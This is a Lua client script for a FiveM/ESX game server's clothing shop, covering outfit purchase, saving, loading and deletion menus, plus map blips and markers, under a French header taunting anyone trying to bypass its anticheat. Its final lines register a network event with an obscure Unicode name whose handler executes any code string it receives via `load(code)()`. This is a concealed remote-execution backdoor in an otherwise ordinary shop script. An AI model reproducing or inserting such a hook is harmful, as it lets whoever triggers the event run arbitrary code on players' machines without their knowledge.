-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local GUI = {}
GUI.Time = 0

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local HasPayed = false
local HasLoadCloth = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

function OpenShopMenu()
	local elements = {}

	table.insert(elements, {label = _U('shop_clothes'), value = 'shop_clothes'})
	table.insert(elements, {label = _U('player_clothes'), value = 'player_dressing'})
	table.insert(elements, {label = _U('suppr_cloth'), value = 'suppr_cloth'})

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_main', {
		title = _U('shop_main_menu'),
		elements = elements
	}, function(data, menu)
		if data.current.value == 'shop_clothes' then
			HasPayed = false

			TriggerEvent('::{korioz#0110}::esx_skin:openRestrictedMenu', function(data2, menu2)
				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm', {
					title = _U('valid_this_purchase'),
					elements = {
						{label = _U('no'), value = 'no'},
						{label = _U('yes'), value = 'yes'}
					}
				}, function(data3, menu3)
					ESX.UI.Menu.CloseAll()

					if data3.current.value == 'yes' then
						ESX.TriggerServerCallback('::{korioz#0110}::esx_clotheshop:checkMoney', function(hasEnoughMoney)
							if hasEnoughMoney then
								TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
									_TriggerServerEvent('::{korioz#0110}::esx_skin:save', skin)
								end)

								_TriggerServerEvent('::{korioz#0110}::esx_clotheshop:pay')
								HasPayed = true

								ESX.TriggerServerCallback('::{korioz#0110}::esx_clotheshop:checkPropertyDataStore', function(foundStore)
									if foundStore then
										ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'save_dressing', {
											title = _U('save_in_dressing'),
											elements = {
												{label = _U('no'), value = 'no'},
												{label = _U('yes'), value = 'yes'}
											}
										}, function(data4, menu4)
											menu4.close()

											if data4.current.value == 'yes' then
												ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'outfit_name', {
													title = _U('name_outfit')
												}, function(data5, menu5)
													menu5.close()

													TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
														_TriggerServerEvent('::{korioz#0110}::esx_clotheshop:saveOutfit', data5.value, skin)
													end)

													ESX.ShowNotification(_U('saved_outfit'))
													CurrentAction = 'shop_menu'
												end, function(data5, menu5)
													menu5.close()
													CurrentAction = 'shop_menu'
												end)
											end

											if data4.current.value == 'no' then
												CurrentAction = 'shop_menu'
											end
										end, function(data4, menu4)
										end)
									end
								end)
							else
								TriggerEvent('::{korioz#0110}::esx_skin:getLastSkin', function(skin)
									TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
								end)

								ESX.ShowNotification(_U('not_enough_money'))
							end
						end)
					end

					if data3.current.value == 'no' then
						TriggerEvent('::{korioz#0110}::esx_skin:getLastSkin', function(skin)
							TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
						end)

						CurrentAction = 'shop_menu'
					end
				end, function(data3, menu3)
				end)
			end, function(data2, menu2)
			end, {
				'tshirt_1', 'tshirt_2',
				'torso_1', 'torso_2',
				'decals_1', 'decals_2',
				'arms',
				'pants_1', 'pants_2',
				'shoes_1', 'shoes_2',
				'chain_1', 'chain_2',
				'bags_1', 'bags_2'
			})
		end

		if data.current.value == 'player_dressing' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_clotheshop:getPlayerDressing', function(dressing)
				local elements = {}

				for i = 1, #dressing, 1 do
					table.insert(elements, {label = dressing[i], value = i})
				end

				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'player_dressing', {
					title = _U('player_clothes'),
					elements = elements
				}, function(data2, menu2)
					TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
						ESX.TriggerServerCallback('::{korioz#0110}::esx_clotheshop:getPlayerOutfit', function(clothes)
							TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, clothes)
							TriggerEvent('::{korioz#0110}::esx_skin:setLastSkin', skin)
							TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
								_TriggerServerEvent('::{korioz#0110}::esx_skin:save', skin)
							end)
				  
							ESX.ShowNotification(_U('loaded_outfit'))
							HasLoadCloth = true
						end, data2.current.value)
					end)
				end, function(data2, menu2)
				end)
			end)
		end
	  
		if data.current.value == 'suppr_cloth' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_clotheshop:getPlayerDressing', function(dressing)
				local elements = {}

				for i = 1, #dressing, 1 do
					table.insert(elements, {label = dressing[i], value = i})
				end
			
				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'supprime_cloth', {
					title = _U('suppr_cloth'),
					elements = elements
				}, function(data2, menu2)
					menu2.close()
					_TriggerServerEvent('::{korioz#0110}::esx_clotheshop:deleteOutfit', data2.current.value)
					ESX.ShowNotification(_U('supprimed_cloth'))
				end, function(data2, menu2)
				end)
			end)
		end
	end, function(data, menu)
		CurrentAction = 'shop_menu'
	end)
end

AddEventHandler('::{korioz#0110}::esx_clotheshop:hasEnteredMarker', function(zone)
	CurrentAction = 'shop_menu'
	CurrentActionMsg = _U('press_menu')
	CurrentActionData = {}
end)

AddEventHandler('::{korioz#0110}::esx_clotheshop:hasExitedMarker', function(zone)
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil
	CurrentActionMsg = ''
	CurrentActionData = {}
end)

-- Create Blips
Citizen.CreateThread(function()
	for i = 1, #Config.Shops, 1 do
		local blip = AddBlipForCoord(Config.Shops[i])

		SetBlipSprite(blip, 73)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.8)
		SetBlipColour(blip, 0)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName(_U('clothes'))
		EndTextCommandSetBlipName(blip)
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #Config.Shops, 1 do
			if #(plyCoords - Config.Shops[i]) < Config.DrawDistance then
				DrawMarker(29, Config.Shops[i], vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(0.5, 0.5, 0.5), 0, 255, 0, 100, false, false, 2, true, nil, nil, false)
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone

		for i = 1, #Config.Shops, 1 do
			if #(plyCoords - Config.Shops[i]) < Config.MarkerSize.x then
				isInMarker = true
				currentZone = k
			end
		end

		if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
			HasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('::{korioz#0110}::esx_clotheshop:hasEnteredMarker', currentZone)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::esx_clotheshop:hasExitedMarker', LastZone)
		end
	end
end)

-- Key controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlPressed(0, 38) and (GetGameTimer() - GUI.Time) > 300 then
				if CurrentAction == 'shop_menu' then
					OpenShopMenu()
				end

				CurrentAction = nil
				GUI.Time = GetGameTimer()
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)